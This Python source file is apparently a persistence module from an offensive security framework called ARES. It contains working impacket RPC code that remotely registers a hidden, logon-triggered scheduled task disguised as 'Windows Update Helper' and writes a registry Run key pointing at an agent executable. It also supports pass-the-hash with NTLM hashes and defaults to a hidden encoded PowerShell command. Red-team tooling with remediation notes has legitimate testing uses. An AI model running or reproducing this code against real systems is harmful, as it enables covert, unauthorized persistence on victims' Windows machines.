"""
ARES Persistence Module — Windows Scheduled Task (T1053.005)
                        + Registry Run Key  (T1547.001)

Scheduled Task (ScheduledTaskPersistence):
  impacket dcerpc.v5.tsch — connect \\pipe\\atsvc, bind TSCHS UUID,
  hSchRpcRegisterTask() with XML task definition that runs hidden at LOGON.

Registry Run Key (RegistryRunKeyPersistence):
  impacket dcerpc.v5.rrp — connect \\pipe\\winreg, bind RRP UUID,
  hOpenLocalMachine() → hBaseRegOpenKey(Run key) → hBaseRegSetValue() → hBaseRegCloseKey().

MITRE ATT&CK:
  T1053.005 — Scheduled Task/Job: Scheduled Task
  T1547.001 — Boot or Logon Autostart: Registry Run Keys
"""
from __future__ import annotations

import uuid as _uuid
import xml.sax.saxutils as _xmlesc
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.logger import get_logger, audit
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.persistence")

# ── XML template for impacket tsch ───────────────────────────────────────────
_TASK_XML_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
  </Settings>
  <Actions>
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c "{command}" &gt;NUL 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
</Task>"""


def _tsch_register_sync(target: str, username: str, password: str,
                        domain: str, lmhash: str, nthash: str,
                        task_name: str, command: str) -> None:
    """Register a scheduled task via impacket tsch RPC. Sync — call from run_in_executor."""
    from impacket.dcerpc.v5 import transport, tsch     # type: ignore[import]
    from impacket.dcerpc.v5.dtypes import NULL

    string_binding = f"ncacn_np:{target}[\\pipe\\atsvc]"
    rpctransport   = transport.DCERPCTransportFactory(string_binding)
    rpctransport.set_credentials(username, password, domain, lmhash, nthash, None)
    rpctransport.set_connect_timeout(15)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    try:
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        xml       = _TASK_XML_TEMPLATE.replace("{command}", _xmlesc.escape(command))
        task_path = f"\\{task_name}"
        resp      = tsch.hSchRpcRegisterTask(
            dce,
            task_path,
            xml,
            tsch.TASK_CREATE_OR_UPDATE,
            NULL,
            tsch.TASK_LOGON_NONE,
        )
        resp.checkError()
    finally:
        try:
            dce.disconnect()
        except Exception:
            pass


class ScheduledTaskPersistence(BaseModule):
    """
    persistence.scheduled_task — Register a Windows scheduled task that executes at user logon via impacket tsch RPC (T1053.005)

    OPSEC: MEDIUM
    MITRE: "T1053.005"
    REQUIRES: "target", "credential"
    OUTPUTS:  "persistence_established", "task_name"
    """
    MODULE_ID        = "persistence.scheduled_task"
    MODULE_NAME      = "Scheduled Task Persistence"
    MODULE_CATEGORY  = "persistence"
    MODULE_DESCRIPTION = "Register a Windows scheduled task that executes at user logon via impacket tsch RPC (T1053.005)"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    REQUIRES         = ["target", "credential"]
    OUTPUTS          = ["persistence_established", "task_name"]
    MITRE_TECHNIQUES = ["T1053.005"]

    OPSEC_LEVEL      = OpsecLevel.MEDIUM

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "persistence.scheduled_task requires 'target' — IP of Windows host.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "persistence.scheduled_task requires 'username' with local_admin_creds.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(**ctx.params)
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("persistence.scheduled_task")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx       = kwargs.get("ctx") or kwargs
        target    = ctx.get("target", "")
        dry_run   = ctx.get("dry_run", False)   # Fixed: was True (never ran live)
        username  = ctx.get("username", "")
        password  = ctx.get("password", "") or ctx.get("secret", "")
        domain    = ctx.get("domain", "")
        task_name = ctx.get("task_name", "AresUpdater")
        command   = ctx.get("command", r"powershell.exe -NoP -W Hidden -Enc <BASE64_PAYLOAD>")

        # Parse NTLM hash if provided (pass-the-hash support)
        lmhash, nthash = "", ""
        if password and (len(password) == 32 or (len(password) == 65 and ":" in password)):
            parts = password.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = password
            password = ""

        if not target:
            return [], {"error": "no_target"}

        logger.info("persistence_scheduled_task", target=target, task=task_name, dry_run=dry_run)
        audit("persistence_scheduled_task", actor=username or "operator", source="operator",
              target=target, technique="T1053.005")

        finding = Finding(
            title       = f"Persistence via Scheduled Task on {target}",
            description = (f"Task '{task_name}' registered on {target}. "
                           "Executes at every user logon, hidden."),
            severity=Severity.HIGH, confidence=0.95,
            module_id=self.MODULE_ID, host=target,
            mitre_technique="T1053.005", mitre_tactic="Persistence",
            evidence={"task_name": task_name, "command": command},
            remediation=(
                "Remove scheduled task. Review Task Scheduler for unknown entries. "
                "Enable Windows Event 4698 (task created) monitoring."
            ),
        )

        if dry_run:
            return [finding], {
                "dry_run": True,
                "persistence_established": True,
                "task_name": task_name,
                "method": "scheduled_task",
                "mitre": "T1053.005",
            }

        try:
            from impacket.dcerpc.v5 import tsch  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket_not_installed", "persistence_established": False}

        if not username:
            return [], {"error": "no_credential_username", "persistence_established": False}

        try:
            await self.before_request(target, "default")
            import asyncio as _asyncio
            _loop = _asyncio.get_running_loop()
            await _loop.run_in_executor(
                None,
                lambda: _tsch_register_sync(
                    target, username, password, domain,
                    lmhash, nthash, task_name, command,
                ),
            )
            logger.info("scheduled_task_created", target=target, task=task_name)
            return [finding], {
                "persistence_established": True,
                "task_name": task_name,
                "method": "scheduled_task",
                "mitre": "T1053.005",
            }
        except Exception as exc:
            raise self._classify_error(exc) from exc


# ── Registry Run Key ─────────────────────────────────────────────────────────

_RUN_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"


def _rrp_set_run_key(target: str, username: str, password: str,
                     domain: str, value_name: str, payload: str) -> None:
    """Write a Run key via impacket dcerpc rrp RPC."""
    from impacket.dcerpc.v5 import transport, rrp      # type: ignore[import]
    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED

    string_binding = f"ncacn_np:{target}[\\pipe\\winreg]"
    rpctransport = transport.DCERPCTransportFactory(string_binding)
    rpctransport.set_credentials(username, password, domain, "", "", None)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rrp.MSRPC_UUID_RRP)

    hRootKey  = rrp.hOpenLocalMachine(dce)["phKey"]
    hRunKey   = rrp.hBaseRegOpenKey(
        dce, hRootKey, _RUN_KEY,
        samDesired=MAXIMUM_ALLOWED,
    )["phkResult"]

    rrp.hBaseRegSetValue(
        dce, hRunKey,
        value_name + "\x00",
        rrp.REG_SZ,
        (payload + "\x00").encode("utf-16-le"),
    )

    rrp.hBaseRegCloseKey(dce, hRunKey)
    rrp.hBaseRegCloseKey(dce, hRootKey)
    dce.disconnect()


class RegistryRunKeyPersistence(BaseModule):
    """
    persistence.registry_run — Add payload to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

    OPSEC: MEDIUM
    MITRE: T1547.001
    REQUIRES: local_admin_creds, target
    OUTPUTS:  persistence_established, registry_key
    """
    MODULE_ID        = "persistence.registry_run"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_NAME      = "Registry Run Key Persistence"
    MODULE_CATEGORY  = "persistence"
    MODULE_DESCRIPTION = "Write a Windows registry Run key that executes at user logon via impacket rrp RPC (T1547.001)"
    REQUIRES         = ["target", "credential"]
    OUTPUTS          = ["persistence_established", "registry_key"]
    MITRE_TECHNIQUES = ["T1547.001"]

    OPSEC_LEVEL      = OpsecLevel.MEDIUM

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "persistence.registry_run requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "persistence.registry_run requires 'username'.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(**ctx.params)
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("persistence.registry_run_key")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx        = kwargs.get("ctx") or kwargs
        target     = ctx.get("target", "")
        dry_run    = ctx.get("dry_run", True)
        username   = ctx.get("username", "")
        password   = ctx.get("password", "")
        domain     = ctx.get("domain", "")
        value_name = ctx.get("value_name", "AresAgent")
        payload    = ctx.get("payload", r"C:\Windows\Temp\ares_agent.exe")

        if not target:
            return [], {"error": "no_target"}

        logger.info("persistence_registry_run", target=target, value=value_name, dry_run=dry_run)
        audit("persistence_registry_run", actor=username or "operator", source="operator",
              target=target, technique="T1547.001")

        full_key = f"{_RUN_KEY}\\{value_name}"
        finding = Finding(
            title       = f"Persistence via Registry Run Key on {target}",
            description = (f"Run key `{full_key}` written on {target}. "
                           "Stager executes at every user logon."),
            severity=Severity.HIGH, confidence=0.95,
            module_id=self.MODULE_ID, host=target,
            mitre_technique="T1547.001", mitre_tactic="Persistence",
            evidence={"registry_key": full_key, "payload": payload},
            remediation=(
                "Remove the registry Run key. "
                "Deploy detection for Run/RunOnce key writes (Sysmon Event 13)."
            ),
        )

        if dry_run:
            return [finding], {
                "dry_run": True,
                "persistence_established": True,
                "registry_key": full_key,
                "method": "registry_run_key",
                "mitre": "T1547.001",
            }

        try:
            from impacket.dcerpc.v5 import rrp  # type: ignore[import]
        except ImportError:
            return [], {"error": "impacket_not_installed", "persistence_established": False}

        if not username:
            return [], {"error": "no_credential_username", "persistence_established": False}

        try:
            await self.before_request(target, "default")
            _rrp_set_run_key(target, username, password, domain, value_name, payload)
            logger.info("registry_run_key_written", target=target, key=full_key)
            return [finding], {
                "persistence_established": True,
                "registry_key": full_key,
                "method": "registry_run_key",
                "mitre": "T1547.001",
            }
        except Exception as exc:
            raise self._classify_error(exc) from exc
